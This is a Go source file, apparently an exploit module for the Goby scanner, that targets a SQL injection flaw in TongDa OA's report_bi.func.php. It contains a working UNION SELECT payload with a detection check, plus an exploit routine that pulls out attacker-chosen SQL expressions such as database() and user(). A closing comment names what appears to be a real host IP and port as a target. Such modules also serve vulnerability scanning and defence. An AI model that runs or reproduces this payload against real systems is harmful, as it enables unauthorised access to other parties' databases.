package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "TongDa OA report_bi.func.php SQLI",
    "Description": "There is a SQL injection vulnerability in TongDa OA, which can be used by attackers to obtain sensitive database information.",
    "Product": "TongDa OA",
    "Homepage": "http://www.tongda2000.com/",
    "DisclosureDate": "2021-05-27",
    "Author": "834714370@qq.com",
    "GobyQuery": "app=\"TongDa-OA\" || app=\"TDXK-Tongda OA\"",
    "Level": "2",
    "Impact": "<p>There is a SQL injection vulnerability in TongDa OA, The user is the root user with the highest authority, which can be used by attackers to obtain sensitive database information.</p>",
    "Recommendation": "",
    "References": [
        "https://cdndown.tongda2000.com/oa/2019/TDOA11.6.exe"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "column1",
            "type": "input",
            "value": "database()"
        },
        {
            "name": "column3",
            "type": "input",
            "value": "user()"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "SQL Injection"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10203"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			data := "_POST[dataset_id]=" + url.QueryEscape("efgh'-@`'`)union select 0x313439346435333938633862396666323965343763383331,2,user()#'") + "&action=get_link_info&"
			uri := "/general/bi_design/appcenter/report_bi.func.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			cfg.Data = data
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, `"1494d5398c8b9ff29e47c831"`) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			column1 := ss.Params["column1"].(string)
			column3 := ss.Params["column3"].(string)
			data := "_POST[dataset_id]=" + url.QueryEscape("efgh'-@`'`)union select "+column1+",2,"+column3+"#'") + "&action=get_link_info&"
			uri := "/general/bi_design/appcenter/report_bi.func.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			cfg.Data = data
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					m1 := regexp.MustCompile(`"col": "(.*?)", "target"`).FindStringSubmatch(resp.RawBody)
					if m1 != nil {
						expResult.Success = true
						expResult.Output += "column1 [" + column1 + "] : " + m1[1] + "\n"
					}

					m2 := regexp.MustCompile(`"para": "(.*?)" }`).FindStringSubmatch(resp.RawBody)
					if m2 != nil {
						expResult.Success = true
						expResult.Output += "column1 [" + column3 + "] : " + m2[1] + "\n"
					}

				} else {
					expResult.Output = resp.Utf8Html
				}
			}
			return expResult
		},
	))
}

// http://219.133.206.206:8888/
